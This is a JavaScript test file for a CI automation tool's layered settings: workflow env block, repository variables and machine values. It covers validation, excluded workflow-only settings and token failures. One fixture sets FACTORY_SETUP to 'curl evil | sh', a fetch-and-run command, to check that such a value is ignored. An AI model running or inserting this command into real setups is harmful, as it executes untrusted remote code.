import "./temp.mjs";
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { createServer } from "node:http";
import { fileURLToPath } from "node:url";
import { WORKFLOW_ONLY_SETTINGS, VARIABLE_SETTINGS, WORKFLOW_SETTINGS, layerLines, resolveInputs, valueProblem, machineSettings, settingLayers, variableSettings } from "../scripts/lib/inputs.mjs";
import { HOT_SETTINGS, Local } from "../scripts/local.mjs";
import { SPENT_GUESS_MS } from "../scripts/lib/holds.mjs";
import { doctorSettings, settingsRows } from "../scripts/doctor.mjs";

// A repository's settings in layers: Factory's defaults, the workflow's env block, repository variables, this machine (#284).

const LAUNCH = fileURLToPath(new URL("../scripts/launch.mjs", import.meta.url));
const INPUTS = fileURLToPath(new URL("../scripts/lib/inputs.mjs", import.meta.url));
const CHOICE = fileURLToPath(new URL("../scripts/lib/choice.mjs", import.meta.url));

test("settingLayers: each layer over the one below; a variable never sets a setting only the workflow file sets; another harness drops the models below it", () => {
  for (const n of ["CREDENTIAL", "AUTO_MERGE", "NOTIFY", "MAINTAINERS", "PROTECTED_PATHS", "ALLOWED_DOMAINS", "LOCAL_DOMAINS", "WORKER_SECRETS", "LOCAL_ENV", "SANDBOX", "HARNESS_VERSION", "SETUP", "INSTALL", "BUDGET_COMMAND", "LOCAL_SETUP", "LOCAL_DB", "THIRD_PARTY_REVIEWERS", "CI_CHECKS", "PG_BIN", "NODE_VERSION"]) {
    assert.ok(WORKFLOW_ONLY_SETTINGS.has(`FACTORY_${n}`) && !VARIABLE_SETTINGS.has(`FACTORY_${n}`), n);
  }
  for (const n of ["MAX_CONCURRENT", "LOCAL_MAX_CONCURRENT", "DAILY_USD", "MAX_USD", "HARNESS", "MODEL", "EFFORT", "VALIDATION", "LOCAL_VALIDATION", "LOCAL_DB_INIT", "SWEEP_MAX_DESTROYS"]) assert.ok(VARIABLE_SETTINGS.has(`FACTORY_${n}`), n);
  for (const k of VARIABLE_SETTINGS) assert.ok(WORKFLOW_SETTINGS.has(k), `${k} is a setting`);

  assert.deepEqual(variableSettings({ FACTORY_MAX_USD: "5", factory_daily_usd: "40", FACTORY_AUTO_MERGE: "false", FACTORY_APP_TOKEN: "x", FACTORY_MODEL: "", OTHER: "y" }), {
    kept: { FACTORY_MAX_USD: "5", FACTORY_DAILY_USD: "40" },
    excluded: ["FACTORY_AUTO_MERGE"],
    unknown: ["FACTORY_APP_TOKEN"],
    invalid: [],
  });
  // A value the env block's parsing would not take as given is named and ignored, never applied.
  const bad = variableSettings({ FACTORY_MAX_CONCURRENT: "2.5", FACTORY_MAX_USD: "lots", FACTORY_DAILY_USD: "-1", FACTORY_HARNESS: " Codex ", FACTORY_RESUME_POLICY: "always", FACTORY_PROMPT_CACHE_TTL: "1H", FACTORY_LOCAL_MAX_CONCURRENT: "0", FACTORY_VALIDATION: "anything goes" });
  assert.deepEqual(bad.kept, { FACTORY_HARNESS: "codex", FACTORY_PROMPT_CACHE_TTL: "1H", FACTORY_VALIDATION: "anything goes" }, "a harness as resolveInputs reads it");
  assert.deepEqual(variableSettings({ FACTORY_HARNESS: "co dex" }).invalid.map((x) => x.why), ["not claude, codex, copilot"]);
  assert.deepEqual(bad.invalid.map((x) => `${x.name} ${x.why}`), [
    "FACTORY_DAILY_USD not a number, 0 or more",
    "FACTORY_LOCAL_MAX_CONCURRENT not a whole number above 0",
    "FACTORY_MAX_CONCURRENT not a whole number above 0",
    "FACTORY_MAX_USD not a number, 0 or more",
    "FACTORY_RESUME_POLICY not fresh, fix-passes",
  ]);
  assert.equal(settingLayers({ workflow: { FACTORY_MAX_USD: "25" }, variables: { FACTORY_MAX_USD: "lots" } }).values.FACTORY_MAX_USD, "25");
  assert.ok(layerLines(settingLayers({ variables: { FACTORY_MAX_USD: "lots" } })).includes('repository variable FACTORY_MAX_USD "lots" ignored: not a number, 0 or more'));

  const workflow = { FACTORY_HARNESS: "claude", FACTORY_MODEL: "claude-opus-5-5", FACTORY_MAX_USD: "25", FACTORY_LOCAL_MAX_CONCURRENT: "1", FACTORY_SETUP: "" };
  const l = settingLayers({ workflow, variables: { FACTORY_MAX_USD: "10", FACTORY_LOCAL_MAX_CONCURRENT: "2", FACTORY_SETUP: "curl evil | sh" }, machine: machineSettings({ FACTORY_LOCAL_MAX_CONCURRENT: "4", FACTORY_MAX_USD: "99", FACTORY_LOCAL_TOKEN: "t" }) });
  assert.deepEqual(l.values, { FACTORY_HARNESS: "claude", FACTORY_MODEL: "claude-opus-5-5", FACTORY_MAX_USD: "10", FACTORY_LOCAL_MAX_CONCURRENT: "4", FACTORY_SETUP: "" });
  assert.deepEqual(l.from, { FACTORY_HARNESS: "workflow", FACTORY_MODEL: "workflow", FACTORY_MAX_USD: "variable", FACTORY_LOCAL_MAX_CONCURRENT: "machine", FACTORY_SETUP: "workflow" });
  assert.deepEqual(l.excluded, ["FACTORY_SETUP"], "named, and ignored");

  // The workflow's models belong to its harness: a variable that picks another drops them, unless it sets its own.
  assert.deepEqual(settingLayers({ workflow, variables: { FACTORY_HARNESS: "codex" } }).values.FACTORY_MODEL, undefined);
  assert.equal(settingLayers({ workflow, variables: { FACTORY_HARNESS: "codex", FACTORY_MODEL: "gpt-x" } }).values.FACTORY_MODEL, "gpt-x");
  assert.equal(settingLayers({ workflow, variables: { FACTORY_HARNESS: "Claude" } }).values.FACTORY_MODEL, "claude-opus-5-5", "the same harness keeps them");

  const lines = layerLines(l);
  assert.deepEqual(lines.slice(0, 4), ['FACTORY_HARNESS: "claude" (workflow)', 'FACTORY_LOCAL_MAX_CONCURRENT: "4" (this machine)', 'FACTORY_MAX_USD: "10" (repository variable)', 'FACTORY_MODEL: "claude-opus-5-5" (workflow)']);
  assert.match(lines[4], /^Factory's defaults: .*FACTORY_DAILY_USD, .*FACTORY_SETUP, /, "an empty workflow value reads as the default");
  assert.equal(lines[5], "repository variable FACTORY_SETUP ignored: only the reviewed workflow file sets it");
});

/** Runs `code` in a fresh Node process with `env` (its FACTORY_* settings as the workflow's env block on Actions), as action.yml's run step starts a script. */
function onActions(code, env) {
  return execFileSync(process.execPath, ["--input-type=module", "-e", code], { encoding: "utf8", env: { PATH: process.env.PATH, HOME: process.env.HOME, TMPDIR: process.env.TMPDIR, GITHUB_ACTIONS: "true", ...env } });
}

test("#402: rebase_limit is a cap a repository variable may set (a whole number above 0); third_party_wait_minutes gates a merge, so only the workflow file sets it", () => {
  assert.ok(VARIABLE_SETTINGS.has("FACTORY_REBASE_LIMIT"));
  assert.deepEqual(variableSettings({ FACTORY_REBASE_LIMIT: "3" }).kept, { FACTORY_REBASE_LIMIT: "3" });
  for (const bad of ["0", "2.5", "many"]) assert.deepEqual(variableSettings({ FACTORY_REBASE_LIMIT: bad }).invalid.map((x) => x.why), ["not a whole number above 0"], bad);
  assert.ok(WORKFLOW_ONLY_SETTINGS.has("FACTORY_THIRD_PARTY_WAIT_MINUTES"));
  assert.deepEqual(variableSettings({ FACTORY_THIRD_PARTY_WAIT_MINUTES: "1" }).excluded, ["FACTORY_THIRD_PARTY_WAIT_MINUTES"]);
  const layers = settingLayers({ workflow: { FACTORY_THIRD_PARTY_WAIT_MINUTES: "30" }, variables: { FACTORY_REBASE_LIMIT: "3", FACTORY_THIRD_PARTY_WAIT_MINUTES: "1" } });
  assert.deepEqual([layers.values.FACTORY_REBASE_LIMIT, layers.from.FACTORY_REBASE_LIMIT, layers.values.FACTORY_THIRD_PARTY_WAIT_MINUTES, layers.from.FACTORY_THIRD_PARTY_WAIT_MINUTES], ["3", "variable", "30", "workflow"]);
  assert.ok(layerLines(layers).includes('FACTORY_REBASE_LIMIT: "3" (repository variable)'), "doctor and serve print the value in force and its layer");
  // guess_hours: a list of hours, each above 0, on every route; a variable may set it.
  assert.deepEqual(variableSettings({ FACTORY_GUESS_HOURS: "2, 6 48" }).kept, { FACTORY_GUESS_HOURS: "2, 6 48" });
  for (const bad of ["0, 4", "1, soon", "1, 193", "1e10"]) assert.deepEqual(variableSettings({ FACTORY_GUESS_HOURS: bad }).invalid.map((x) => x.why), ["not a list of hours, each a number above 0, at most 192"], bad);
  assert.deepEqual(variableSettings({ FACTORY_GUESS_HOURS: "1, 192" }).kept, { FACTORY_GUESS_HOURS: "1, 192" }, "the longest hold a record keeps, 8 days, is the longest step");
  assert.deepEqual(resolveInputs({ env: { FACTORY_GUESS_HOURS: "1e10" } }).guessMs, SPENT_GUESS_MS, "past it: the default");
  // third_party_wait_minutes: at most 24 hours; past it, the default.
  assert.equal(valueProblem("FACTORY_THIRD_PARTY_WAIT_MINUTES", "1441"), "not a number above 0, at most 1440 (24 hours)");
  assert.equal(valueProblem("FACTORY_THIRD_PARTY_WAIT_MINUTES", "1440"), null);
  assert.equal(resolveInputs({ env: { FACTORY_THIRD_PARTY_WAIT_MINUTES: "1e12" } }).thirdPartyWaitMs, 20 * 60_000);
  assert.equal(resolveInputs({ env: { FACTORY_THIRD_PARTY_WAIT_MINUTES: "1440" } }).thirdPartyWaitMs, 1440 * 60_000);
  assert.deepEqual(resolveInputs({ env: { FACTORY_GUESS_HOURS: "2, 6 48" } }).guessMs, [2, 6, 48].map((h) => h * 3600_000));
  assert.deepEqual(resolveInputs({ env: {} }).guessMs, SPENT_GUESS_MS, "Factory's default is holds.mjs's");
  assert.deepEqual(resolveInputs({ env: { FACTORY_GUESS_HOURS: "-1" } }).guessMs, SPENT_GUESS_MS);
  // serve takes a change of either at its next tick, as it does the other scheduling settings.
  for (const k of ["FACTORY_REBASE_LIMIT", "FACTORY_GUESS_HOURS"]) assert.ok(HOT_SETTINGS.includes(k), k);
});

test("on Actions the workflow's `vars` input lays the repository's variables over the env block before any script reads a setting, and the launcher hands them to the cloud sandbox's stage (#284)", () => {
  const block = { FACTORY_HARNESS: "claude", FACTORY_MODEL: "claude-opus-5-5", FACTORY_MAX_CONCURRENT: "3", FACTORY_MAX_USD: "25", FACTORY_TIMEOUT_MINUTES: "240", FACTORY_AUTO_MERGE: "true" };
  const vars = { FACTORY_MAX_CONCURRENT: "6", FACTORY_MAX_USD: "10", FACTORY_AUTO_MERGE: "false", FACTORY_TIMEOUT_MINUTES: "300", ANTHROPIC_OIDC_EXCHANGE_URL: "https://x" };
  const code = `const { stageEnvironment } = await import(${JSON.stringify(LAUNCH)});
const { resolveInputs } = await import(${JSON.stringify(INPUTS)});
const inputs = resolveInputs({ args: { repo: "o/r" } });
const stage = stageEnvironment({ inputs, stage: "work", issue: 7, claim: "c", tokens: { write: "w" } });
console.log(JSON.stringify({ left: process.env.FACTORY_INPUT_VARS ?? null, inputs: { maxConcurrent: inputs.maxConcurrent, maxUsd: inputs.maxUsd, autoMerge: inputs.autoMerge, timeoutMinutes: inputs.timeoutMinutes, model: inputs.model }, stage: { max: stage.FACTORY_MAX_CONCURRENT, usd: stage.FACTORY_MAX_USD, merge: stage.FACTORY_AUTO_MERGE, vars: Object.keys(stage).filter((k) => k.endsWith("_VARS")) } }));`;
  const out = onActions(code, { ...block, FACTORY_INPUT_VARS: JSON.stringify(vars) });
  const result = JSON.parse(out.trim().split("\n").at(-1));
  assert.deepEqual(result, {
    left: null,
    inputs: { maxConcurrent: 6, maxUsd: 10, autoMerge: true, timeoutMinutes: 240, model: "claude-opus-5-5" },
    stage: { max: "6", usd: "10", merge: "true", vars: [] },
  });
  assert.match(out, /repository variables set FACTORY_MAX_CONCURRENT="6", FACTORY_MAX_USD="10" over the workflow's env block/);
  assert.match(out, /repository variable FACTORY_AUTO_MERGE ignored: only the reviewed workflow file sets it/);
  assert.match(out, /repository variable FACTORY_TIMEOUT_MINUTES 300 is over the workflow's 240, the runner jobs' own timeout-minutes: kept at 240 on Actions/);
  assert.doesNotMatch(out, /ANTHROPIC_OIDC/, "not Factory's: no prefix");

  // A harness picked by a variable takes its own models, as the install step installs it (action.yml).
  // Its CLI version is the latest: the workflow's harness_version pins the workflow's own harness (choice.mjs harnessVersionFor).
  const codex = JSON.parse(onActions(`const { resolveInputs, workflowHarness } = await import(${JSON.stringify(INPUTS)}); const { harnessVersionFor } = await import(${JSON.stringify(CHOICE)}); const i = resolveInputs({ args: {} }); console.log(JSON.stringify([i.harness, i.model, workflowHarness(), harnessVersionFor(i.harness, workflowHarness(), i.harnessVersion)]));`, { ...block, FACTORY_HARNESS_VERSION: "2.1.140", FACTORY_INPUT_VARS: JSON.stringify({ FACTORY_HARNESS: "Codex" }) }).trim().split("\n").at(-1));
  assert.deepEqual(codex, ["codex", "gpt-6.1-sol", "claude", "latest"]);

  // A workflow rendered without the input: no variable layer.
  const none = JSON.parse(onActions(`const { resolveInputs } = await import(${JSON.stringify(INPUTS)}); console.log(JSON.stringify(resolveInputs({ args: {} }).maxConcurrent));`, block).trim());
  assert.equal(none, 3);
});

/**
 * A GitHub whose variables lists (the repository's, and the organization's it shares) answer `answer(path)`: {status},
 * or {vars}. Returns the server's URL, its requests, and close.
 */
async function variablesHost(answer) {
  const asked = [];
  const server = createServer((req, res) => {
    const path = new URL(req.url, "http://x").pathname;
    asked.push(path);
    const a = answer(path);
    if (a.status) return res.writeHead(a.status, { "content-type": "application/json" }).end(JSON.stringify({ message: "Resource not accessible by personal access token" }));
    res.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify({ total_count: 1, variables: Object.entries(a.vars).map(([name, value]) => ({ name, value })) }));
  });
  await new Promise((ok) => server.listen(0, "127.0.0.1", ok));
  return { url: `http://127.0.0.1:${server.address().port}`, asked, close: () => new Promise((ok) => server.close(ok)) };
}

async function withApi(url, fn) {
  const before = process.env.GITHUB_API_URL;
  process.env.GITHUB_API_URL = url;
  const lines = [];
  const write = process.stdout.write;
  process.stdout.write = (chunk, ...rest) => (lines.push(String(chunk)), write.call(process.stdout, chunk, ...rest));
  try {
    await fn();
  } finally {
    process.stdout.write = write;
    if (before === undefined) delete process.env.GITHUB_API_URL;
    else process.env.GITHUB_API_URL = before;
  }
  return lines.join("");
}

test("serve's start: the repository's variables over the workflow, each setting printed with its layer, an ignored variable named; a token without Variables: read warns and the workflow's values stand (#284)", async () => {
  let answer = { vars: { FACTORY_MAX_CONCURRENT: "5", FACTORY_NOTIFY: "someone#1" } };
  const host = await variablesHost(() => answer);
  const start = () => Object.assign(Object.create(Local.prototype), { repo: { owner: "o", name: "r", full: "o/r" }, token: "t", settingsBranch: "main", workflowWf: { FACTORY_MAX_CONCURRENT: "2", FACTORY_MODEL: "m" } });
  try {
    let loop = start();
    const text = await withApi(host.url, async () => {
      await loop.readVariables();
      loop.startSettings();
    });
    assert.deepEqual(host.asked, ["/repos/o/r/actions/variables"]);
    assert.deepEqual(loop.wf, { FACTORY_MAX_CONCURRENT: "5", FACTORY_MODEL: "m" });
    assert.match(text, /settings, each over the one below \(Factory's defaults, the workflow on origin\/main, the repository's variables, this machine\):/);
    assert.match(text, /  FACTORY_MAX_CONCURRENT: "5" \(repository variable\)\n/);
    assert.match(text, /  FACTORY_MODEL: "m" \(workflow\)\n/);
    assert.match(text, /  Factory's defaults: .*FACTORY_DAILY_USD/);
    assert.match(text, /repository variable FACTORY_NOTIFY ignored: only the reviewed workflow file sets it/);

    answer = { status: 403 };
    loop = start();
    const refused = await withApi(host.url, async () => {
      await loop.readVariables();
      await loop.readVariables();
      loop.startSettings();
    });
    assert.equal(refused.split("the local token cannot read this repository's variables (HTTP 403)").length - 1, 1, "said once");
    assert.match(refused, /give the token Variables: read/);
    assert.equal(loop.wf.FACTORY_MAX_CONCURRENT, "2", "the workflow's value stands");
  } finally {
    await host.close();
  }
});

test("doctor: the settings row names each setting's layer; in local mode a token without Variables: read is a WARN with the fix (#284)", async () => {
  let answer = { vars: { FACTORY_DAILY_USD: "40", FACTORY_SANDBOX: "vercel" } };
  const host = await variablesHost(() => answer);
  try {
    let r;
    await withApi(host.url, async () => {
      r = await doctorSettings({ args: { checkout: "/nowhere" }, checkout: "/nowhere", repo: { owner: "o", name: "r", full: "o/r" }, token: "app", varsToken: "local", env: { FACTORY_LOCAL_MAX_CONCURRENT: "3" }, local: true });
    });
    assert.equal(r.inputs.dailyUsd, 40);
    const rows = settingsRows(r.layers);
    assert.equal(rows[0].name, "settings");
    assert.match(rows[0].detail, /FACTORY_DAILY_USD: "40" \(repository variable\)/);
    assert.match(rows[0].detail, /FACTORY_LOCAL_MAX_CONCURRENT: "3" \(this machine\)/);
    assert.deepEqual([rows[1].status, rows[1].detail], ["WARN", "repository variable FACTORY_SANDBOX ignored: only the reviewed workflow file sets it"]);
    assert.equal(r.inputs.sandbox, "", "ignored");

    answer = { status: 404 };
    await withApi(host.url, async () => {
      r = await doctorSettings({ args: { checkout: "/nowhere" }, checkout: "/nowhere", repo: { owner: "o", name: "r", full: "o/r" }, token: "app", varsToken: "local", env: {}, local: true });
    });
    assert.deepEqual(r.checks.map((c) => [c.status, c.name, c.fix]), [["WARN", "repository variables", "give the local token Variables: read (docs/LOCAL.md, Set it up)"]]);
    assert.match(r.checks[0].detail, /^the local token cannot read the repository's variables \(HTTP 404\), so the checks take the workflow's values and so does local mode on this machine$/);
    assert.equal(r.inputs.dailyUsd, 100);
  } finally {
    await host.close();
  }
});

test("doctor warns when a Factory step of the installed workflow passes no vars: the variables do not apply on Actions there (#284)", async () => {
  const { varsInputCheck } = await import("../scripts/doctor.mjs");
  const { renderWorkflow } = await import("../scripts/setup.mjs");
  const { readFileSync } = await import("node:fs");
  const rendered = renderWorkflow(readFileSync(new URL("../workflow-template.yml", import.meta.url), "utf8"), { harness: "claude", runs_on: "ubuntu-latest" });
  assert.equal(varsInputCheck(rendered).status, "PASS");
  const older = rendered.replace(/, vars: "\$\{\{ toJSON\(vars\) \}\}"/, "");
  const c = varsInputCheck(older);
  assert.equal(c.status, "WARN");
  assert.match(c.detail, /^1 of the workflow's \d+ Factory steps passes no vars, so the repository's FACTORY_\* variables do not apply on Actions there$/);
  assert.equal(varsInputCheck("jobs: {}\n"), null);
});

test("serve's start fails closed: no stage starts on the workflow's values alone until a read of the variables gets through or GitHub says the token may not; run stops after three tries (#284)", async () => {
  const { resetNetwork } = await import("../scripts/lib/network.mjs");
  let failing = 2;
  let refused = false;
  const host = await variablesHost((path) => {
    if (path.endsWith("/organization-variables")) return { vars: { FACTORY_DAILY_USD: "1", OTHER: "x" } };
    if (refused) return { status: 404 };
    return failing-- > 0 ? { status: 401 } : { vars: { FACTORY_MAX_CONCURRENT: "1" } };
  });
  const start = () => Object.assign(Object.create(Local.prototype), { repo: { owner: "o", name: "r", full: "o/r" }, repoFull: "o/r", token: "t", startVariablesMs: 1, workflowWf: { FACTORY_MAX_CONCURRENT: "4" } });
  try {
    let loop = start();
    const text = await withApi(host.url, () => loop.startVariables({ serve: true }));
    assert.deepEqual(host.asked, ["/repos/o/r/actions/variables", "/repos/o/r/actions/variables", "/repos/o/r/actions/variables", "/repos/o/r/actions/organization-variables"]);
    assert.deepEqual(loop.variables, { FACTORY_MAX_CONCURRENT: "1" }, "the cap the variable lowered holds from the first stage");
    assert.match(text, /the local token was refused \(401\): replace it in \S+tokens\/o\/r; no stage starts until a read gets through/);
    assert.equal(text.split("the repository's variables could not be read").length - 1, 1, "the failure is said once");
    assert.match(text, /organization variable FACTORY_DAILY_USD is not supported: Factory's settings take the repository's own variables only, so local mode ignores it, while on Actions it reaches the jobs unless the repository sets the same name/);
    loop.startSettings();
    assert.equal(loop.wf.FACTORY_MAX_CONCURRENT, "1");

    // `run`: three failed reads, and nothing starts.
    failing = 10;
    loop = start();
    await withApi(host.url, () => assert.rejects(loop.startVariables(), /^Error: reading the repository's variables failed 3 times \(GET .*\(401\).*\); nothing was started, run it again$/));

    // A token without Variables: read is no failure: one read, the workflow's values, said with the fix.
    refused = true;
    host.asked.length = 0;
    loop = start();
    const said = await withApi(host.url, () => loop.startVariables({ serve: true }));
    assert.deepEqual(host.asked, ["/repos/o/r/actions/variables"]);
    assert.match(said, /cannot read this repository's variables \(HTTP 404\)/);
    loop.startSettings();
    assert.equal(loop.wf.FACTORY_MAX_CONCURRENT, "4");
  } finally {
    resetNetwork();
    await host.close();
  }
});

test("serve's start on a refused token (401): named, with where to replace it, every third wait; never the workflow's values; a token replaced there is taken (#284)", async () => {
  const { resetNetwork } = await import("../scripts/lib/network.mjs");
  let refusals = 7;
  const auth = [];
  const server = createServer((req, res) => {
    const path = new URL(req.url, "http://x").pathname;
    if (path.endsWith("/actions/variables")) auth.push(req.headers.authorization);
    const ok = path.endsWith("/organization-variables") || req.headers.authorization === "Bearer fresh" || refusals-- <= 0;
    if (!ok) return res.writeHead(401, { "content-type": "application/json" }).end(JSON.stringify({ message: "Bad credentials" }));
    res.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify({ total_count: 1, variables: path.endsWith("/organization-variables") ? [] : [{ name: "FACTORY_MAX_USD", value: "3" }] }));
  });
  await new Promise((ok) => server.listen(0, "127.0.0.1", ok));
  const url = `http://127.0.0.1:${server.address().port}`;
  const start = () => Object.assign(Object.create(Local.prototype), { repo: { owner: "o", name: "r", full: "o/r" }, repoFull: "o/r", token: "t", startVariablesMs: 1, workflowWf: { FACTORY_MAX_USD: "25" } });
  try {
    let loop = start();
    const text = await withApi(url, () => loop.startVariables({ serve: true }));
    const line = /the local token was refused \(401\): replace it in [^;]+; no stage starts until a read gets through/g;
    assert.equal(text.match(line).length, 3, "seven refusals: said at the first, fourth and seventh wait");
    assert.doesNotMatch(text, /\[factory\] the local token cannot read this repository's variables/, "no fallback to the workflow's values");
    assert.deepEqual(loop.variables, { FACTORY_MAX_USD: "3" });

    // A token replaced in its source meanwhile is the one the next try reads with.
    refusals = 100;
    auth.length = 0;
    process.env.FACTORY_LOCAL_TOKEN = "fresh";
    loop = start();
    await withApi(url, () => loop.startVariables({ serve: true }));
    assert.deepEqual(auth, ["Bearer t", "Bearer fresh"]);
    assert.equal(loop.token, "fresh");
  } finally {
    delete process.env.FACTORY_LOCAL_TOKEN;
    resetNetwork();
    await new Promise((ok) => server.close(ok));
  }
});

test("#413: triage_min_confidence is a setting from 0 to 1 that goes with the triage_model it was set beside, in every layer", async () => {
  const { MACHINE_SETTINGS } = await import("../scripts/lib/inputs.mjs");
  const { confidenceFloor } = await import("../scripts/lib/triage.mjs");
  const floor = (env) => resolveInputs({ env }).triageMinConfidence;
  assert.equal(floor({}), null);
  assert.deepEqual(confidenceFloor(resolveInputs({ env: {} })), { min: 0.7, set: false, text: "default floor 0.7" });
  const gateway = { asked: () => ({ name: "ai-gateway", model: "perplexity/pplx-decider-v1.2" }) };
  assert.deepEqual(confidenceFloor(resolveInputs({ env: { FACTORY_TRIAGE_MIN_CONFIDENCE: "0.85" } }), gateway), { min: 0.85, set: true, text: "floor 0.85" });
  // Only while the gateway's triage model answers: the stage's harness (also after the gateway refused) is another model.
  assert.deepEqual(confidenceFloor(resolveInputs({ env: { FACTORY_TRIAGE_MIN_CONFIDENCE: "0.85" } }), { asked: () => ({ name: "harness", model: "claude claude-opus-5-5" }) }), { min: 0.7, set: false, text: "default floor 0.7" });
  for (const [v, want] of [["0", 0], ["1", 1], [" 0.5 ", 0.5], ["1.5", null], ["-0.1", null], ["high", null]]) assert.equal(floor({ FACTORY_TRIAGE_MIN_CONFIDENCE: v }), want, v);
  // A model named above the floor's own layer (the Action's input, a flag) is not the model the floor was set for.
  assert.equal(floor({ FACTORY_TRIAGE_MODEL: "a/x", FACTORY_TRIAGE_MIN_CONFIDENCE: "0.85", FACTORY_INPUT_TRIAGE_MODEL: "b/y" }), null);
  assert.equal(resolveInputs({ args: { triage_model: "b/y" }, env: { FACTORY_TRIAGE_MIN_CONFIDENCE: "0.85" } }).triageMinConfidence, null);
  assert.equal(floor({ FACTORY_INPUT_TRIAGE_MODEL: "b/y", FACTORY_INPUT_TRIAGE_MIN_CONFIDENCE: "0.6" }), 0.6);
  assert.equal(floor({ FACTORY_INPUT_TRIAGE_MODEL: "b/y", FACTORY_TRIAGE_MODEL: "b/y", FACTORY_INPUT_TRIAGE_MIN_CONFIDENCE: "0.6" }), 0.6);
  // The default resolved: naming the default model above a floor set beside no model (the default) keeps the floor.
  assert.equal(floor({ FACTORY_TRIAGE_MIN_CONFIDENCE: "0.85", FACTORY_INPUT_TRIAGE_MODEL: "perplexity/pplx-decider-v1.2" }), 0.85);
  assert.equal(floor({ FACTORY_TRIAGE_MODEL: "b/y", FACTORY_TRIAGE_MIN_CONFIDENCE: "0.85", FACTORY_INPUT_TRIAGE_MODEL: "b/y" }), 0.85, "the same model named again");
  // A repository variable out of range is refused by name.
  assert.equal(valueProblem("FACTORY_TRIAGE_MIN_CONFIDENCE", "2"), "not a number from 0 to 1");
  assert.equal(valueProblem("FACTORY_TRIAGE_MIN_CONFIDENCE", "0.8"), null);
  assert.deepEqual(variableSettings({ FACTORY_TRIAGE_MIN_CONFIDENCE: "2" }).invalid.map((x) => x.name), ["FACTORY_TRIAGE_MIN_CONFIDENCE"]);
  // A layer that names another triage model drops the floor of the layers below it, unless it sets its own.
  const workflow = { FACTORY_TRIAGE_MODEL: "a/x", FACTORY_TRIAGE_MIN_CONFIDENCE: "0.85" };
  const at = (layers) => settingLayers({ workflow, ...layers }).values.FACTORY_TRIAGE_MIN_CONFIDENCE;
  assert.equal(at({ variables: { FACTORY_TRIAGE_MODEL: "b/y" } }), undefined, "another model: the floor below goes");
  assert.equal(at({ variables: { FACTORY_TRIAGE_MODEL: "a/x" } }), "0.85", "the same model keeps it");
  assert.equal(settingLayers({ workflow: { FACTORY_TRIAGE_MIN_CONFIDENCE: "0.85" }, variables: { FACTORY_TRIAGE_MODEL: "perplexity/pplx-decider-v1.2" } }).values.FACTORY_TRIAGE_MIN_CONFIDENCE, "0.85", "the default model named is no other model");
  assert.equal(at({ variables: { FACTORY_TRIAGE_MODEL: "b/y", FACTORY_TRIAGE_MIN_CONFIDENCE: "0.6" } }), "0.6");
  assert.equal(at({ variables: { FACTORY_TRIAGE_MIN_CONFIDENCE: "0.6" } }), "0.6", "a floor alone is for the model below it");
  assert.equal(at({ machine: { FACTORY_TRIAGE_MODEL: "c/z" } }), undefined, "this machine's model too");
  assert.ok(MACHINE_SETTINGS.includes("FACTORY_TRIAGE_MIN_CONFIDENCE"), "a machine sets it beside its triage model");
  assert.ok(WORKFLOW_SETTINGS.has("FACTORY_TRIAGE_MIN_CONFIDENCE") && VARIABLE_SETTINGS.has("FACTORY_TRIAGE_MIN_CONFIDENCE"));
});
